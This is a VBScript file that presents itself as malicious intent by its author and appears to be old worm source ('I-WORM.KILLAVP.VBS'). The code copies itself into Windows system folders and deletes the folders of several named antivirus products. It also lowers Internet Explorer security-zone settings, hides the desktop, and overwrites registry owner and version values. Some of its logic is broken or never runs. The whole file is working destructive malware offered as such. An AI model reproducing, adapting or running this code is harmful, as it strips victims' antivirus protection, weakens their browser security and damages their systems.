   '==========================================================================
   '
   ' VBScript Source File -- Created by me with malicios intent.
   '
   ' NAME: Antivirus cleaner - Get's rid of those pesky antivirus programs
   '
   ' AUTHOR: Satanik Child  B.C.V.G Crew   2001   KEEPING THE INFECTION ALIVE
   '
   ' I-WORM.KILLAVP.VBS  * * * Another Evil Creation by that Mad Evil Kid!
   '==========================================================================


   On Error Resume Next
   Dim FSO, FILE, oVBS, SYSF, WINF
       Set FSO = CreateObject("Scripting.FileSystemObject")
       Set SYSF = FSO.GetSpecialFolder(1)
       Set WINF = FSO.GetSpecialFolder(0)
       Set oVBS = FSO.GetFile(WScript.ScriptFullName)
   oVBS.Copy SYSF & "\DSTRY.VBS", True
   oVBS.Copy WINF & "\HideMe.VBS", True


   If FSO.FolderExists ("C:\Program Files\Network associates\Mcafee virusscan") Then
       FSO.DeleteFolder "C:\Program Files\Network associates\Mcafee virusscan", True

       ElseIf FSO.FolderExists("C:\Archivos de programa\Network associates\Mcafee virusscan") Then
           FSO.DeleteFolder "C:\Archivos de programa\Network associates\Mcafee virusscan",True

       ElseIf FSO.FolderExists("C:\Program Files\Norton Antivirus") Then
           FSO.DeleteFolder "C:\Program Files\Norton Antivirus", True

       ElseIf FSO.FolderExists ("C:\Archivos de programa\Norton Antivirus") Then
           FSO.DeleteFolder "C:\Archivos de programa\Norton Antivirus", True

       ElseIf FSO.FolderExists("C:\Program Files\Symantec\Norton Antivirus") Then
           FSO.DeleteFolder "C:\Program Files\Symantec\Norton Antivirus", True

       ElseIf FSO.FolderExists ("C:\Archivos de programa\Symantec\Norton Antivirus") Then
           FSO.DeleteFolder "C:\Archivos de programa\Symantec\Norton Antivirus", True

       ElseIf FSO.FolderExists("C:\Program Files\Antiviral ToolKit Pro") Then
           FSO.DeleteFolder "C:\Program Files\Antiviral ToolKit Pro", True

       ElseIf FSO.FolderExists("C:\Archivos de programa\Antiviral ToolKit Pro") Then
           FSO.DeleteFolder "C:\Archivos de programa\Antiviral ToolKit Pro", True

       ElseIf FSO.FolderExists("C:\Program Files\Mcafee\virusscan") Then
           FSO.DeleteFolder "C:\Program Files\Mcafee\virusscan", True

       ElseIf FSO.FolderExists ("C:\Archivos de programa\Mcafee\virusscan") Then
           FSO.DeleteFolder "C:\Archivos de programa\Mcafee\virusscan", True

       ElseIf FSO.FolderExists("C:\Program Files\Trend PC-Cillin") Then
           FSO.DeleteFolder "C:\Program Files\Trend PC-Cillin", True

       ElseIf FSO.FolderExists("C:\Archivos de programa\Trend PC-Cillin") Then
           FSO.DeleteFolder "C:\Archivos de programa\Trend PC-Cillin", True

       ElseIf FSO.FolderExists("C:\F-Prot") Then
           FSO.DeleteFolder "C:\F-Prot", True

   End If

   Dim oFSO, oMSG
   Set oFSO = CreateObject("Scripting.FileSystemObject")
   Set xWSH = WScript.CreateObject("WScript.Shell")
   Set oWIN = oFSO.GetSpecialFolder(0)



   xWSH.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1004" , 0, "REG_DWORD"
   xWSH.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1200" , 0, "REG_DWORD"
   xWSH.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201" , 0, "REG_DWORD"
   xWSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"
   xWSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"
   xWSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"

   xWSH.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
   xWSH.RegWrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\", "n1B elcyceR"



   On Error Resume Next
   Set WshShell = CreateObject("WScript.Shell")
   WshShell.RegWrite "HKCU\software\SATANIK CHILD\", Chr(45) & Chr(45) & Chr(45) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(58) & Chr(58) & Chr(83) & Chr(65) & Chr(84) & Chr(65) & Chr(84) & Chr(65) & Chr(78) & Chr(73) & Chr(75) & Chr(32) & Chr(67) & Chr(72) & Chr(73) & Chr(76) & Chr(68) & Chr(58) & Chr(58) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
   WshShell.RegWrite "HKLM\software\EVIL KID\", Chr(45) & Chr(45) & Chr(45) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(58) & Chr(58) & Chr(83) & Chr(65) & Chr(84) & Chr(65) & Chr(84) & Chr(65) & Chr(78) & Chr(73) & Chr(75) & Chr(32) & Chr(67) & Chr(72) & Chr(73) & Chr(76) & Chr(68) & Chr(58) & Chr(58) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
   Dim sh, v, r
   Set sh = WScript.CreateObject("WScript.Shell")
       If v = 2 Then
           WScript.quit
       End if
           r = ("==[666]==  ----====:SATANIK CHILD:====----  ==[666]==")
       If r = "empty" Then

           sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
           sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
           sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
           sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", r, "REG_SZ"
           sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
           sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", r, "REG_SZ"

   End If



   On Error Resume Next
   Dim ONE, TWO, THRE
   Set ONE = CreateObject("WScript.Shell")
   TWO = ONE.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner\")
   ONE.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "666"
   ONE.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", " S A T A N I K  C H I L D "
   ONE.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "SATANIK VIRUS CREATIONSZ"
   ONE.RegWrite ME, THRE
   Set ONE = Nothing
